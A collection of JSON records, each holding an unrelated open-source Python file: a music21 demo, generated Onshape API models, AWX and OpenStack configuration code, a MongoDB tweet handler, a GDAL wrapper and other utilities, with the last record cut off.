{"text": "# -*- coding: utf-8 -*-\r\n#-------------------------------------------------------------------------------\r\n# Name:         demos/trecento/largestAmbitus.py\r\n# Purpose:      find Trecento/ars nova pieces with large ambitus\r\n#\r\n# Authors:      Michael Scott Cuthbert\r\n#\r\n# Copyright:    Copyright \u00a9 2012 Michael Scott Cuthbert and the music21 Project\r\n# License:      LGPL or BSD, see license.txt\r\n#-------------------------------------------------------------------------------\r\n'''\r\nOn September 11, 2012, Camilla Cavicchi reported to me the finding of\r\na new fragment in the Ferrara archives.  One unknown piece has an extraordinary\r\nlarge range in the top voice: a 15th within a few notes.  The clefs can't \r\nbe read and the piece is an adaptation into\r\nStroke notation, so it's unlikely to have an exact match in the database\r\n(also the piece is probably from the 1430s [MSC, guess, not CC], so it's\r\nnot likely to be in the Trecento database anyhow).  \r\n\r\nThis demo uses the .analyze('ambitus') function of music21 to try\r\nto find a match for the ambitus (or at least narrow down the search for others)\r\nby finding all parts within pieces where the range is at least a 15th.\r\n'''\r\nfrom music21 import corpus, converter\r\n\r\ndef main():\r\n    trecentoFiles = corpus.getWork('trecento')\r\n    for t in trecentoFiles:\r\n        print (t)\r\n        tparsed = converter.parse(t)\r\n        for p in tparsed.parts:\r\n            ambi = p.analyze('ambitus')\r\n            distance = ambi.diatonic.generic.undirected\r\n            if distance >= 15:\r\n                print (\"************ GOT ONE!: {0} ************\".format(ambi))\r\n            elif distance >= 9:\r\n                print (ambi)\r\n            else:\r\n                pass\r\n\r\n#-------------------------------------------------------------------------------\r\n# define presented order in documentation\r\n_DOC_ORDER = []\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n\r\n#------------------------------------------------------------------------------\r\n# eof\r\n\r\n"}
{"text": "# coding: utf-8\n\n\"\"\"\n    Onshape REST API\n\n    The Onshape REST API consumed by all clients.  # noqa: E501\n\n    The version of the OpenAPI document: 1.113\n    Contact: api-support@onshape.zendesk.com\n    Generated by: https://openapi-generator.tech\n\"\"\"\n\n\nfrom __future__ import absolute_import\nimport re  # noqa: F401\nimport sys  # noqa: F401\n\nimport six  # noqa: F401\nimport nulltype  # noqa: F401\n\nfrom onshape_client.oas.model_utils import (  # noqa: F401\n    ModelComposed,\n    ModelNormal,\n    ModelSimple,\n    date,\n    datetime,\n    file_type,\n    int,\n    none_type,\n    str,\n    validate_get_composed_info,\n)\n\n\nclass BTBillOfMaterialsTable1073AllOf(ModelNormal):\n    \"\"\"NOTE: This class is auto generated by OpenAPI Generator.\n    Ref: https://openapi-generator.tech\n\n    Do not edit the class manually.\n\n    Attributes:\n      allowed_values (dict): The key is the tuple path to the attribute\n          and the for var_name this is (var_name,). The value is a dict\n          with a capitalized key describing the allowed value and an allowed\n          value. These dicts store the allowed enum values.\n      attribute_map (dict): The key is attribute name\n          and the value is json key in definition.\n      discriminator_value_class_map (dict): A dict to go from the discriminator\n          variable value to the discriminator class name.\n      validations (dict): The key is the tuple path to the attribute\n          and the for var_name this is (var_name,). The value is a dict\n          that stores validations for max_length, min_length, max_items,\n          min_items, exclusive_maximum, inclusive_maximum, exclusive_minimum,\n          inclusive_minimum, and regex.\n      additional_properties_type (tuple): A tuple of classes accepted\n          as additional properties values.\n    \"\"\"\n\n    allowed_values = {}\n\n    validations = {}\n\n    additional_properties_type = None\n\n    @staticmethod\n    def openapi_types():\n        \"\"\"\n        This must be a class method so a model may have properties that are\n        of type self, this ensures that we don't create a cyclic import\n\n        Returns\n            openapi_types (dict): The key is attribute name\n                and the value is attribute type.\n        \"\"\"\n        return {\n            \"bt_type\": (str,),  # noqa: E501\n            \"failed_metadata_representative_occurrences\": ([str],),  # noqa: E501\n            \"indented\": (bool,),  # noqa: E501\n            \"showing_excluded\": (bool,),  # noqa: E501\n        }\n\n    @staticmethod\n    def discriminator():\n        return None\n\n    attribute_map = {\n        \"bt_type\": \"btType\",  # noqa: E501\n        \"failed_metadata_representative_occurrences\": \"failedMetadataRepresentativeOccurrences\",  # noqa: E501\n        \"indented\": \"indented\",  # noqa: E501\n        \"showing_excluded\": \"showingExcluded\",  # noqa: E501\n    }\n\n    @staticmethod\n    def _composed_schemas():\n        return None\n\n    required_properties = set(\n        [\n            \"_data_store\",\n            \"_check_type\",\n            \"_from_server\",\n            \"_path_to_item\",\n            \"_configuration\",\n        ]\n    )\n\n    def __init__(\n        self,\n        _check_type=True,\n        _from_server=False,\n        _path_to_item=(),\n        _configuration=None,\n        **kwargs\n    ):  # noqa: E501\n        \"\"\"bt_bill_of_materials_table1073_all_of.BTBillOfMaterialsTable1073AllOf - a model defined in OpenAPI\n\n        Keyword Args:\n            _check_type (bool): if True, values for parameters in openapi_types\n                                will be type checked and a TypeError will be\n                                raised if the wrong type is input.\n                                Defaults to True\n            _path_to_item (tuple/list): This is a list of keys or values to\n                                drill down to the model in received_data\n                                when deserializing a response\n            _from_server (bool): True if the data is from the server\n                                False if the data is from the client (default)\n            _configuration (Configuration): the instance to use when\n                                deserializing a file_type parameter.\n                                If passed, type conversion is attempted\n                                If omitted no type conversion is done.\n            bt_type (str): [optional]  # noqa: E501\n            failed_metadata_representative_occurrences ([str]): [optional]  # noqa: E501\n            indented (bool): [optional]  # noqa: E501\n            showing_excluded (bool): [optional]  # noqa: E501\n        \"\"\"\n\n        self._data_store = {}\n        self._check_type = _check_type\n        self._from_server = _from_server\n        self._path_to_item = _path_to_item\n        self._configuration = _configuration\n\n        for var_name, var_value in six.iteritems(kwargs):\n            if (\n                var_name not in self.attribute_map\n                and self._configuration is not None\n                and self._configuration.discard_unknown_keys\n                and self.additional_properties_type is None\n            ):\n                # discard variable.\n                continue\n            setattr(self, var_name, var_value)\n"}
{"text": "# Copyright (c) 2017 Ansible Tower by Red Hat\n# All Rights Reserved.\nimport sys\nimport six\n\nfrom awx.main.utils.pglock import advisory_lock\nfrom awx.main.models import Instance, InstanceGroup\n\nfrom django.core.management.base import BaseCommand, CommandError\n\n\nclass InstanceNotFound(Exception):\n    def __init__(self, message, changed, *args, **kwargs):\n        self.message = message\n        self.changed = changed\n        super(InstanceNotFound, self).__init__(*args, **kwargs)\n\n\nclass Command(BaseCommand):\n\n    def add_arguments(self, parser):\n        parser.add_argument('--queuename', dest='queuename', type=lambda s: six.text_type(s, 'utf8'),\n                            help='Queue to create/update')\n        parser.add_argument('--hostnames', dest='hostnames', type=lambda s: six.text_type(s, 'utf8'),\n                            help='Comma-Delimited Hosts to add to the Queue (will not remove already assigned instances)')\n        parser.add_argument('--controller', dest='controller', type=lambda s: six.text_type(s, 'utf8'),\n                            default='', help='The controlling group (makes this an isolated group)')\n        parser.add_argument('--instance_percent', dest='instance_percent', type=int, default=0,\n                            help='The percentage of active instances that will be assigned to this group'),\n        parser.add_argument('--instance_minimum', dest='instance_minimum', type=int, default=0,\n                            help='The minimum number of instance that will be retained for this group from available instances')\n\n\n    def get_create_update_instance_group(self, queuename, instance_percent, instance_min):\n        ig = InstanceGroup.objects.filter(name=queuename)\n        created = False\n        changed = False\n\n        (ig, created) = InstanceGroup.objects.get_or_create(name=queuename)\n        if ig.policy_instance_percentage != instance_percent:\n            ig.policy_instance_percentage = instance_percent\n            changed = True\n        if ig.policy_instance_minimum != instance_min:\n            ig.policy_instance_minimum = instance_min\n            changed = True\n\n        if changed:\n            ig.save()\n\n        return (ig, created, changed)\n\n    def update_instance_group_controller(self, ig, controller):\n        changed = False\n        control_ig = None\n\n        if controller:\n            control_ig = InstanceGroup.objects.filter(name=controller).first()\n\n        if control_ig and ig.controller_id != control_ig.pk:\n            ig.controller = control_ig\n            ig.save()\n            changed = True\n\n        return (control_ig, changed)\n\n    def add_instances_to_group(self, ig, hostname_list):\n        changed = False\n\n        instance_list_unique = set([x.strip() for x in hostname_list if x])\n        instances = []\n        for inst_name in instance_list_unique:\n            instance = Instance.objects.filter(hostname=inst_name)\n            if instance.exists():\n                instances.append(instance[0])\n            else:\n                raise InstanceNotFound(six.text_type(\"Instance does not exist: {}\").format(inst_name), changed)\n\n        ig.instances.add(*instances)\n\n        instance_list_before = ig.policy_instance_list\n        instance_list_after = instance_list_unique\n        new_instances = set(instance_list_after) - set(instance_list_before)\n        if new_instances:\n            changed = True\n            ig.policy_instance_list = ig.policy_instance_list + list(new_instances)\n            ig.save()\n\n        return (instances, changed)\n\n    def handle(self, **options):\n        instance_not_found_err = None\n        queuename = options.get('queuename')\n        if not queuename:\n            raise CommandError(\"Specify `--queuename` to use this command.\")\n        ctrl = options.get('controller')\n        inst_per = options.get('instance_percent')\n        inst_min = options.get('instance_minimum')\n        hostname_list = []\n        if options.get('hostnames'):\n            hostname_list = options.get('hostnames').split(\",\")\n\n        with advisory_lock(six.text_type('instance_group_registration_{}').format(queuename)):\n            changed2 = False\n            changed3 = False\n            (ig, created, changed1) = self.get_create_update_instance_group(queuename, inst_per, inst_min)\n            if created:\n                print(six.text_type(\"Creating instance group {}\".format(ig.name)))\n            elif not created:\n                print(six.text_type(\"Instance Group already registered {}\").format(ig.name))\n\n            if ctrl:\n                (ig_ctrl, changed2) = self.update_instance_group_controller(ig, ctrl)\n                if changed2:\n                    print(six.text_type(\"Set controller group {} on {}.\").format(ctrl, queuename))\n\n            try:\n                (instances, changed3) = self.add_instances_to_group(ig, hostname_list)\n                for i in instances:\n                    print(six.text_type(\"Added instance {} to {}\").format(i.hostname, ig.name))\n            except InstanceNotFound as e:\n                instance_not_found_err = e\n\n        if any([changed1, changed2, changed3]):\n            print('(changed: True)')\n\n        if instance_not_found_err:\n            print(instance_not_found_err.message)\n            sys.exit(1)\n\n"}
{"text": "#httplib was ok and httplib2 especially had nice api, but they don't work thru proxies and stuff\n#-- curl is the most robust thing\n#import httplib\nimport curl #a high level wrapper over pycurl bindings\nimport json\nimport hashlib #only 'cause has a hardcoded pwd here now - for real this comes from connection or launcher\n\ntry:\n    import naali\nexcept ImportError:\n    naali = None #so that can test standalone too, without Naali\nelse:\n    import circuits\n    class SimiangridAuthentication(circuits.BaseComponent):\n        pass #put disconnecting to on_exit here to not leave old versions while reloading\n\nurl = \"http://localhost/Grid/\"\n\nc = curl.Curl()\ndef simiangrid_auth(url, username, md5hex):\n    params = {'RequestMethod': 'AuthorizeIdentity', \n             'Identifier': username, \n             'Type': 'md5hash', \n             'Credential': md5hex}\n\n    rdata = c.post(url, params)\n\n    print rdata\n    r = json.loads(rdata)\n\n    #http://code.google.com/p/openmetaverse/wiki/AuthorizeIdentity\n    success = r.get('Success', False) \n    #NOTE: docs say reply should have Success:false upon failure.\n    #however in my test run it doesn't just the Message of missing/invalid creds\n    #this code works for that too. \n\n    return success\n\ndef on_connect(conn_id, userconn):\n    print userconn.GetLoginData()\n    username = userconn.GetProperty(\"username\")\n    username = username.replace('_', ' ') #XXX HACK: tundra login doesn't allow spaces, whereas simiangrid frontend demands them\n    pwd = userconn.GetProperty(\"password\")\n\n    md5hex = hashlib.md5(pwd).hexdigest()\n    success = simiangrid_auth(url, username, md5hex)\n    print \"Authentication success:\", success, \"for\", conn_id, userconn\n\n    if not success:\n        userconn.DenyConnection()\n\nif naali is not None:\n    s = naali.server\n    if s.IsAboutToStart():\n        s.connect(\"UserAboutToConnect(int, UserConnection*)\", on_connect)\n        print \"simiangrid/auth.py running on server - hooked to authorize connections\"\n\nelse:\n    on_connect(17, {'username': \"Lady Tron\",\n                    'password': \"They only want you when you're seventeen\"})\n\n    \"\"\"\n    { \"Success\":true, \"UserID\":\"fe5f5ac3-7b28-4276-ae50-133db72040f0\" }\n    Authentication success: True\n    \"\"\"\n"}
{"text": "# https://docs.python.org/3.6/howto/logging.html#logging-basic-tutorial\nimport logging\nimport sys\n\n\ndef get_logger(name):\n    \"\"\"\n    Log to stream only. Don't add a handler to log to a file.\n    Let program user decide if they want to pipe stream output to a file e.g.\n        python3 fibonacci.py >> ../fib.log\n        python3 -m unittest >> ../test.log\n\n    References\n    https://12factor.net/logs\n    \"logging in an application\"\n    https://docs.python-guide.org/writing/logging/\n\n    https://stackoverflow.com/questions/22807972/python-best-practice-in-terms-of-logging\n    https://stackoverflow.com/questions/28330317/print-timestamp-for-logging-in-python\n    https://docs.python.org/3/library/logging.html#formatter-objects\n    https://docs.python.org/3.6/howto/logging.html#logging-basic-tutorial\n    https://docs.python.org/3.6/howto/logging.html#logging-to-a-file\n\n    :param name: logger name\n    :return: a configured logger\n    \"\"\"\n    formatter = logging.Formatter(fmt='%(asctime)s %(levelname)-8s %(funcName)s line:%(lineno)s %(message)s',\n                                  datefmt='%Y-%m-%d %H:%M:%S')\n\n    logger = logging.getLogger(name)\n    logger.setLevel(logging.DEBUG)\n\n    # add one or more handlers\n\n    # log stream to terminal stdout. program user can choose to pipe stream to a file.\n    screen_handler = logging.StreamHandler(stream=sys.stdout)\n    screen_handler.setFormatter(formatter)\n    logger.addHandler(screen_handler)\n\n    # Don't log to file. See docstring for rationale.\n    # mode 'a' append, not 'w' write\n    # handler = logging.FileHandler('./data/output/fib.log', mode='a')\n    # handler.setFormatter(formatter)\n    # logger.addHandler(handler)\n\n    return logger\n\n"}
{"text": "#!/usr/bin/python\n\nimport getopt, sys\nimport encode\nfrom encode import *\n\ndef regions_complement(regions):\n    comp_regions = encode.regions()\n\n    for region_name in regions.keys():\n        # store an alias for the region with name region_name - just readability\n        data = regions[region_name]\n        comp_regions[region_name] = encode.feature_region( data.length, (), region_name )\n\n        # for each feature interval, store the non-region *before* it\n        prev_end = -1\n        for fi in data.iter_feature_regions():\n            if fi.start - prev_end > 1:\n                comp_regions[region_name].add(interval(prev_end+1, fi.start-1))\n            prev_end = fi.end\n         \n        # store the non-feature interval after the last feature interval\n        if prev_end < data.length - 1:\n            comp_regions[region_name].add(interval(prev_end+1, data.length-1))\n\n    return comp_regions\n\ndef usage():\n  print >> output, \"\"\"\n  Take the complement of a feature set.\n\n  ie, mark every feature a non-feature and every non-feature a feature. \n\n  REQUIRED ARGUMENTS:\n  -i --input : the input file. \n  \n  -d --domain : the domain of the data files, the portion of the genome over \n  which the features ( from --input ) are defined.\n\n  The file formats are described in the README under INPUT FILE FORMATS.\n\n  OPTIONAL ARGUMENTS:\n\n  -p --prefix: The prefix for the new output files. Defaults to 'complement_'.\n\n  -v --verbose: Print extra output\n\n  -h --help: Print this help info and exit.\n\"\"\"\n\ndef main():\n    try:\n        long_args = [\"input=\", \"domain=\", \"output_file_prefix=\", \"verbose\", \"help\"]\n        opts, args = getopt.getopt(sys.argv[1:], \"i:d:o:vh\", long_args)\n    except getopt.GetoptError, err:\n        print str(err)\n        usage()\n        sys.exit(2)\n\n    # set the default options\n    output_fname_prefix = \"complement_\"\n\n    for o, a in opts:\n        if o in (\"-v\", \"--verbose\"):\n            global verbose\n            verbose = True\n        elif o in (\"-h\", \"--help\"):\n            usage()\n            sys.exit()\n        elif o in (\"-i\", \"--input\"):\n            bed_fp = open(a)\n        elif o in (\"-d\", \"--domain\"):\n            domain_fp = open(a)\n\n    try: \n        assert vars().has_key('bed_fp')\n        assert vars().has_key('domain_fp')\n    except Exception, inst:\n        usage()\n        print inst\n        sys.exit()\n    \n    regions = parse_bed_file(bed_fp, domain_fp)\n    bed_fp.close()\n    domain_fp.close()\n\n    regions_comp = regions_complement(regions)\n    # free this memory in case we need it for the file write    \n    del regions\n\n    of = open(prefix_filename(bed_fp.name, output_fname_prefix), 'w')\n    olf = open(prefix_filename(domain_fp.name, output_fname_prefix), 'w')\n    regions_comp.writeBedFile(of, olf)\n    of.close()\n    olf.close()\n\nif __name__ == \"__main__\":\n    main()\n\n"}
{"text": "import logging\n\nfrom pymongo import MongoClient\n\n\nclass MongoDBHandler:\n    def __init__(self, config_name):\n        # Display progress logs on stdout\n        logging.basicConfig(level=logging.INFO,\n                            format='>>> %(asctime)s %(levelname)s %(message)s')\n\n        from configparser import ConfigParser\n        from urllib.parse import quote_plus\n        config = ConfigParser()\n        config.read(config_name)\n        mongodb_uri = \"mongodb://%s:%s@%s:%s\" % (quote_plus(config['mongodb']['username']),\n                                                 quote_plus(config['mongodb']['password']),\n                                                 config['mongodb']['host'],\n                                                 config['mongodb']['port'])\n        # print(mongodb_uri)\n\n        #  MongoDB connection\n        self.client = MongoClient(mongodb_uri)\n        self.db_name = config['mongodb']['db_name']\n        self.db = self.client[self.db_name]\n\n        from pymongo.errors import ConnectionFailure\n        try:\n            # The ismaster command is cheap and does not require auth.\n            self.client.admin.command('ismaster')\n        except ConnectionFailure:\n            print(\"Server not available\")\n\n        print(self.client.database_names())\n\n    def save_user_timeline(self, item):\n        db = self.db\n        print(item['user_id'])\n        type(item['user_id'])\n        # TODO: de-hardcode DB name\n        twt = db.tweets.find({'user_id': item['user_id']})\n        if twt.count() == 0:\n            # save user timeline\n            print(\"New account:\", item['screen_name'], item['user_id'], item['n_tweets'], item['lang'])\n            db.tweets.insert_one(item)\n        else:\n            # update the existing account record\n            res = db.tweets.replace_one(\n                {'user_id': item['user_id']}, item\n            )\n            # result of the update\n            if res.matched_count == 0:\n                print(\"no match for user_id: \", item['user_id'])\n            elif res.modified_count == 0:\n                print(\"no modification for user_id: \", item['user_id'])\n            else:\n                print(\"replaced \", item['screen_name'], item['user_id'], item['n_tweets'], item['lang'])\n\n    def aggregate_tweets(self, timeline, lang=None):\n        \"\"\"\n        Get the user's timeline with the list of tweets in the following format and aggregate into one document.\n\n        {'lang': 'en',\n         'n_tweets': 100,\n         'parent_account': 'Honda',\n         'screen_name': 'Kevinloveslife',\n         'user_id': 701100381380546561,\n         'tweets': [{'country': None,\n             'country_code': None,\n             'created_at': 'Sun May 14 23:38:58 +0000 2017',\n             'favorite_count': 0,\n             'id': 863901480285241346,\n             'lang': 'en',\n             'retweet_count': 0,\n             'text': 'Last time flying @united. pilot Joe is a complete ass '\n                     'hole. United flight 3556. Yells at us for using the '\n                     'bathroom when we are delayed 1hr.'},\n            {'country': None,\n             'country_code': None,\n             'created_at': 'Fri May 12 00:16:08 +0000 2017',\n             'favorite_count': 1,\n             'id': 862823672054243328,\n             'lang': 'en',\n             'retweet_count': 0,\n             'text': \"@DMC_Ryan I'm literally sobbing in the airport while \"\n                     'listening to podcast unlocked and looking at pictures of '\n                     'Maggie. Dogs are the best.'}]\n                     }\n\n        :param lang: str\n        :param timeline: dict\n        :return: dict('user_id': account_id, 'all_tweets': str(concatenated_tweets))\n        \"\"\"\n        if lang is None:\n            twt_doc = ' '.join([t['text'] for t in timeline['tweets']])\n        else:\n            twt_doc = ' '.join([t['text'] for t in timeline['tweets'] if t['lang'] == lang])\n        return {'user_id': timeline['user_id'], 'all_tweets': twt_doc}\n\n    def get_timelines_for_parent(self, parent_name):\n        \"\"\"\n        Get timelines for all friends (following) for this twitter account and return tweets aggregated for each user.\n        :param parent_name: \n        :return: [{'user_id': 110, 'all_tweets': 'Tweet 11. Tweet 12. Tweet 13'},\n                  {'user_id': 220, 'all_tweets': 'Tweet 21. Tweet 22. Tweet 23'}]\n        \"\"\"\n\n        db = self.db\n        cursor = db.tweets.find({'parent_account': parent_name})\n        friends_tweets = []\n        for tl in range(cursor.count()):\n            friends_tweets.append(self.aggregate_tweets(cursor.next()))\n        return friends_tweets\n\n    def get_user_timeline(self, account_name):\n        \"\"\"\n        Get timeline for specified user.\n        :param account_name: str\n        :return: {'user_id': 110, 'all_tweets': 'Tweet 11. Tweet 12. Tweet 13'}\n        \"\"\"\n\n        db = self.db\n        cursor = db.tweets.find({'screen_name': account_name})\n        if cursor.count() > 0:\n            return cursor.next()\n        else:\n            logging.error(\"There are {} entries in DB for user {}\".format(cursor.count(), account_name))\n            raise BaseException(\"Tweet for specified account not found\")\n"}
{"text": "# Copyright (c) 2016 OpenStack Foundation\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nfrom keystoneauth1 import loading as ks_loading\nfrom oslo_config import cfg\n\ncinder_group = cfg.OptGroup(\n    'cinder',\n    title='Cinder Options',\n    help=\"Configuration options for the block storage\")\n\ncinder_opts = [\n    cfg.StrOpt('catalog_info',\n            default='volumev3::publicURL',\n            regex='(\\w+):(\\w*):(.*?)',\n            help=\"\"\"\nInfo to match when looking for cinder in the service catalog.\n\nThe ``<service_name>`` is optional and omitted by default since it should\nnot be necessary in most deployments.\n\nPossible values:\n\n* Format is separated values of the form:\n  <service_type>:<service_name>:<endpoint_type>\n\nNote: Nova does not support the Cinder v2 API since the Nova 17.0.0 Queens\nrelease.\n\nRelated options:\n\n* endpoint_template - Setting this option will override catalog_info\n\"\"\"),\n    cfg.StrOpt('endpoint_template',\n               help=\"\"\"\nIf this option is set then it will override service catalog lookup with\nthis template for cinder endpoint\n\nPossible values:\n\n* URL for cinder endpoint API\n  e.g. http://localhost:8776/v3/%(project_id)s\n\nNote: Nova does not support the Cinder v2 API since the Nova 17.0.0 Queens\nrelease.\n\nRelated options:\n\n* catalog_info - If endpoint_template is not set, catalog_info will be used.\n\"\"\"),\n    cfg.StrOpt('os_region_name',\n               help=\"\"\"\nRegion name of this node. This is used when picking the URL in the service\ncatalog.\n\nPossible values:\n\n* Any string representing region name\n\"\"\"),\n    cfg.IntOpt('http_retries',\n               default=3,\n               min=0,\n               help=\"\"\"\nNumber of times cinderclient should retry on any failed http call.\n0 means connection is attempted only once. Setting it to any positive integer\nmeans that on failure connection is retried that many times e.g. setting it\nto 3 means total attempts to connect will be 4.\n\nPossible values:\n\n* Any integer value. 0 means connection is attempted only once\n\"\"\"),\n    cfg.BoolOpt('cross_az_attach',\n                default=True,\n                help=\"\"\"\nAllow attach between instance and volume in different availability zones.\n\nIf False, volumes attached to an instance must be in the same availability\nzone in Cinder as the instance availability zone in Nova.\nThis also means care should be taken when booting an instance from a volume\nwhere source is not \"volume\" because Nova will attempt to create a volume using\nthe same availability zone as what is assigned to the instance.\nIf that AZ is not in Cinder (or allow_availability_zone_fallback=False in\ncinder.conf), the volume create request will fail and the instance will fail\nthe build request.\nBy default there is no availability zone restriction on volume attach.\n\"\"\"),\n]\n\n\ndef register_opts(conf):\n    conf.register_group(cinder_group)\n    conf.register_opts(cinder_opts, group=cinder_group)\n    ks_loading.register_session_conf_options(conf,\n                                             cinder_group.name)\n    ks_loading.register_auth_conf_options(conf, cinder_group.name)\n\n\ndef list_opts():\n    return {\n        cinder_group.name: (\n            cinder_opts +\n            ks_loading.get_session_conf_options() +\n            ks_loading.get_auth_common_conf_options() +\n            ks_loading.get_auth_plugin_conf_options('password') +\n            ks_loading.get_auth_plugin_conf_options('v2password') +\n            ks_loading.get_auth_plugin_conf_options('v3password'))\n    }\n"}
{"text": "# -*- coding: utf-8 -*-\n#\n# Copyright 2008 Zuza Software Foundation\n#\n# This file is part of the Translate Toolkit.\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"Import units from translations files into tmdb.\"\"\"\n\nimport logging\nimport os\nfrom argparse import ArgumentParser\n\nfrom translate.storage import factory, tmdb\n\n\nlogger = logging.getLogger(__name__)\n\n\nclass Builder:\n\n    def __init__(self, tmdbfile, source_lang, target_lang, filenames):\n        self.tmdb = tmdb.TMDB(tmdbfile)\n        self.source_lang = source_lang\n        self.target_lang = target_lang\n\n        for filename in filenames:\n            if not os.path.exists(filename):\n                logger.error(\"cannot process %s: does not exist\", filename)\n                continue\n            elif os.path.isdir(filename):\n                self.handledir(filename)\n            else:\n                self.handlefile(filename)\n        self.tmdb.connection.commit()\n\n    def handlefile(self, filename):\n        try:\n            store = factory.getobject(filename)\n        except Exception as e:\n            logger.error(str(e))\n            return\n        # do something useful with the store and db\n        try:\n            self.tmdb.add_store(store, self.source_lang, self.target_lang, commit=False)\n        except Exception as e:\n            print(e)\n        print(\"File added:\", filename)\n\n    def handlefiles(self, dirname, filenames):\n        for filename in filenames:\n            pathname = os.path.join(dirname, filename)\n            if os.path.isdir(pathname):\n                self.handledir(pathname)\n            else:\n                self.handlefile(pathname)\n\n    def handledir(self, dirname):\n        path, name = os.path.split(dirname)\n        if name in [\"CVS\", \".svn\", \"_darcs\", \".git\", \".hg\", \".bzr\"]:\n            return\n        entries = os.listdir(dirname)\n        self.handlefiles(dirname, entries)\n\n\ndef main():\n    parser = ArgumentParser()\n    parser.add_argument(\n        \"-d\", \"--tmdb\", dest=\"tmdb_file\", default=\"tm.db\",\n        help=\"translation memory database file (default: %(default)s)\")\n    parser.add_argument(\n        \"-s\", \"--import-source-lang\", dest=\"source_lang\", default=\"en\",\n        help=\"source language of translation files (default: %(default)s)\")\n    parser.add_argument(\n        \"-t\", \"--import-target-lang\", dest=\"target_lang\",\n        help=\"target language of translation files\", required=True)\n    parser.add_argument(\n        \"files\", metavar=\"input files\", nargs=\"+\"\n    )\n    args = parser.parse_args()\n\n    logging.basicConfig(format=\"%(name)s: %(levelname)s: %(message)s\")\n\n    Builder(args.tmdb_file, args.source_lang, args.target_lang, args.files)\n\n\nif __name__ == '__main__':\n    main()\n"}
{"text": "#!/usr/bin/python\n\n# This code is simply a wrapper for running gdal commands, without MATLAB\n# causing issues with dependencies, etc.\n\nimport sys\nimport os\n\nprint(sys.argv[0])\n\naction = sys.argv[1]\ntargetfile = sys.argv[2]\n\nif action == \"merge\":\n    print('Mergeing...')\n    # gdalbuildvrt merged.vrt r14bn2.wgs84.tif r14en1.wgs84.tif r14ez1.wgs84.tif r14bz2.wgs84.tif r14bz1.wgs84.tif r14bn1.wgs84.tif r09dz1.wgs84.tif r09dz2.wgs84.tif r09gz1.wgs84.tif\n    # gdalbuildvrt output.vrt files-to-be-merged.tif separated-by-spaces.tif\n    # python gisactions.py merge data/dem/output.vrt data/dem/r14bn2.wgs84.tif data/dem/r14bn1.wgs84.tif\n\n    # First create a virtual mosaic\n    # Cmd format: gdalbuildvrt output.vrt file1.tif file2.tif file3.tif\n    print('Creating mosaic...')\n    targetvrt = targetfile.replace(\".tif\", \".vrt\")\n    cmd_mosaic = \"gdalbuildvrt %s %s\" % (targetvrt, ' '.join(sys.argv[3:]))\n    os.system(cmd_mosaic)\n\n    # Now translate the mosaic to an actual GeoTiff\n    # Cmd format: gdal_translate -of GTiff mosaic.vrt output.tif\n    mergedfile = sys.argv[2].replace(\".wgs84.tif\", \".merged.wgs84.vrt\")\n    cmd_merge = \"gdal_translate -a_srs \\\"+proj=longlat +ellps=WGS84 +datum=WGS84 +no_defs\\\" -of GTiff %s %s\" % (targetvrt, targetfile)\n    os.system(cmd_merge)\n\n    # Now remove the .vrt\n    os.remove(targetvrt)\n\n    print('Merge finished...')\nelif action == \"reproject\":\n    print('Reprojecting...')\nelse:\n    print('No valid action provided.')\n"}
{"text": "# -*- coding: utf-8 -*-\n\n\"\"\"\n    g_octave.description_tree\n    ~~~~~~~~~~~~~~~~~~~~~~~~~\n\n    This module implements a Python object with the content of a directory\n    tree with DESCRIPTION files. The object contains *g_octave.Description*\n    objects for each DESCRIPTION file.\n\n    :copyright: (c) 2009-2010 by Rafael Goncalves Martins\n    :license: GPL-2, see LICENSE for more details.\n\"\"\"\n\nfrom __future__ import absolute_import\n\n__all__ = ['DescriptionTree']\n\nimport glob\nimport os\nimport re\n\nfrom .config import Config\nfrom .description import Description\nfrom .log import Log\nfrom portage.versions import vercmp\n\nlog = Log('g_octave.description_tree')\nconfig = Config()\n\n\n# from http://wiki.python.org/moin/HowTo/Sorting/\ndef cmp_to_key(mycmp):\n    'Convert a cmp= function into a key= function'\n\n    class K(object):\n        def __init__(self, obj, *args):\n            self.obj = obj\n        def __lt__(self, other):\n            return mycmp(self.obj, other.obj) < 0\n        def __gt__(self, other):\n            return mycmp(self.obj, other.obj) > 0\n        def __eq__(self, other):\n            return mycmp(self.obj, other.obj) == 0\n        def __le__(self, other):\n            return mycmp(self.obj, other.obj) <= 0\n        def __ge__(self, other):\n            return mycmp(self.obj, other.obj) >= 0\n        def __ne__(self, other):\n            return mycmp(self.obj, other.obj) != 0\n\n    return K\n\n\nclass DescriptionTree(list):\n\n    def __init__(self, parse_sysreq=True):\n        log.info('Parsing the package database.')\n        list.__init__(self)\n        self._categories = [i.strip() for i in config.categories.split(',')]\n        for my_file in glob.glob(os.path.join(config.db, 'octave-forge', \\\n                                              '**', '**', '*.DESCRIPTION')):\n            description = Description(my_file, parse_sysreq=parse_sysreq)\n            if description.CAT in self._categories:\n                self.append(description)\n\n    def package_versions(self, pn):\n        tmp = []\n        for pkg in self:\n            if pkg.PN == pn:\n                tmp.append(pkg.PV)\n        tmp.sort(key=cmp_to_key(vercmp))\n        return tmp\n\n    def latest_version(self, pn):\n        tmp = self.package_versions(pn)\n        return (len(tmp) > 0) and tmp[-1] or None\n\n    def latest_version_from_list(self, pv_list):\n        tmp = pv_list[:]\n        tmp.sort(key=cmp_to_key(vercmp))\n        return (len(tmp) > 0) and tmp[-1] or None\n\n    def search(self, term):\n        # term can be a regular expression\n        re_term = re.compile(r'%s' % term)\n        packages = {}\n        for pkg in self:\n            if re_term.search(pkg.PN) is not None:\n                if pkg.PN not in packages:\n                    packages[pkg.PN] = []\n                packages[pkg.PN].append(pkg.PV)\n                